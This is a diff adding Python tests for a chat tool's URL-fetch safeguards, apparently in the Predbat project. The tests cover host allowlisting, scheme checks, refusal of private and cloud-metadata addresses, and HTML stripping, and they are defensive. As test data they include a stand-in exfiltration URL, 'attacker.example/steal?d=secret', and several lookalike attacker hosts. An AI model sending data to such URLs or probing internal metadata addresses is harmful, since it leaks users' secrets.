@@ -23,6 +23,7 @@ import tempfile
 
 import chat_tools
 from chat_tools import CHAT_TOOL_DEFS, score_documents, search_docs, read_source, search_source, resolve_source_path, SourceAccessError
+from chat_tools import DEFAULT_FETCH_ALLOWLIST, FetchRefusedError, host_allowed, html_to_text, validate_fetch_target
 from agent_tools import openai_tool_list
 
 SAMPLE_DOCS = [
@@ -426,6 +427,105 @@ def test_source_extension_matching_edge_cases(my_predbat):
     return failed
 
 
+def _resolver(address):
+    """Return a fake DNS resolver that maps every hostname to one address."""
+
+    def resolve(host):
+        """Pretend every hostname resolves to the configured address."""
+        return [address]
+
+    return resolve
+
+
+def test_host_allowlist(my_predbat):
+    """Exact hosts and their subdomains pass; lookalike hosts must not."""
+    failed = False
+    print("**** Testing fetch host allowlist ****")
+    allowed = ["springfall2008.github.io", "github.com"]
+    for host in ["springfall2008.github.io", "github.com", "docs.github.com"]:
+        if not host_allowed(host, allowed):
+            print("ERROR: {} should be allowed".format(host))
+            failed = True
+    for host in ["evilspringfall2008.github.io", "github.com.attacker.example", "notgithub.com", "attacker.example", ""]:
+        if host_allowed(host, allowed):
+            print("ERROR: {} was allowed - substring matching would be an exfiltration hole".format(host))
+            failed = True
+    return failed
+
+
+def test_validate_fetch_target(my_predbat):
+    """Scheme, allowlist and resolved-address rules all refuse before any request is made."""
+    failed = False
+    print("**** Testing fetch target validation ****")
+    allowlist = list(DEFAULT_FETCH_ALLOWLIST)
+    public = _resolver("140.82.121.4")
+
+    try:
+        validate_fetch_target("https://github.com/springfall2008/batpred", allowlist, resolver=public)
+    except FetchRefusedError as error:
+        print("ERROR: a legitimate GitHub URL was refused: {}".format(error))
+        failed = True
+
+    refusals = [
+        ("http://github.com/x", "plain http"),
+        ("ftp://github.com/x", "a non-http scheme"),
+        ("https://attacker.example/x", "an off-allowlist host"),
+        ("not a url", "a malformed url"),
+    ]
+    for url, why in refusals:
+        try:
+            validate_fetch_target(url, allowlist, resolver=public)
+            print("ERROR: {} was accepted ({})".format(url, why))
+            failed = True
+        except FetchRefusedError:
+            pass
+
+    for address, why in [("127.0.0.1", "loopback"), ("192.168.1.10", "private"), ("169.254.169.254", "link-local metadata"), ("0.0.0.0", "unspecified"), ("::1", "IPv6 loopback")]:
+        try:
+            validate_fetch_target("https://github.com/x", allowlist, resolver=_resolver(address))
+            print("ERROR: an allowlisted host resolving to {} ({}) was accepted".format(address, why))
+            failed = True
+        except FetchRefusedError:
+            pass
+
+    return failed
+
+
+def test_html_to_text(my_predbat):
+    """Script and style bodies are dropped, tags stripped, entities decoded."""
+    failed = False
+    print("**** Testing html_to_text ****")
+    text = html_to_text("<html><head><style>p{color:red}</style><script>var secret=1;</script></head><body><h1>Title</h1><p>Hello &amp; welcome</p></body></html>")
+    for banned in ["var secret", "color:red", "<p>", "<script"]:
+        if banned in text:
+            print("ERROR: html_to_text leaked {!r}: {!r}".format(banned, text))
+            failed = True
+    if "Title" not in text or "Hello & welcome" not in text:
+        print("ERROR: html_to_text lost the readable content: {!r}".format(text))
+        failed = True
+    return failed
+
+
+def test_fetch_url_refusals_are_results(my_predbat):
+    """A refused fetch comes back as a tool result naming the rule, never as an exception."""
+    failed = False
+    print("**** Testing fetch_url refusal reporting ****")
+    result = asyncio.run(chat_tools.fetch_url("https://attacker.example/steal?d=secret", resolver=_resolver("93.184.216.34")))
+    if result.get("success"):
+        print("ERROR: fetch_url fetched an off-allowlist host")
+        failed = True
+    if not result.get("error"):
+        print("ERROR: fetch_url refused without naming a reason: {}".format(result))
+        failed = True
+
+    result = asyncio.run(chat_tools.fetch_url("https://github.com/x", allowlist=["github.com"], resolver=_resolver("10.0.0.5")))
+    if result.get("success"):
+        print("ERROR: fetch_url reached a private address through an allowlisted host")
+        failed = True
+
+    return failed
+
+
 def run_chat_tools_tests(my_predbat):
     """Run every chat-only tool test, returning True if any of them failed."""
     failed = False
@@ -438,4 +538,8 @@ def run_chat_tools_tests(my_predbat):
     failed |= test_read_source_refuses_everything_it_should(my_predbat)
     failed |= test_search_source_bounds_a_single_large_file(my_predbat)
     failed |= test_source_extension_matching_edge_cases(my_predbat)
+    failed |= test_host_allowlist(my_predbat)
+    failed |= test_validate_fetch_target(my_predbat)
+    failed |= test_html_to_text(my_predbat)
+    failed |= test_fetch_url_refusals_are_results(my_predbat)
     return failed
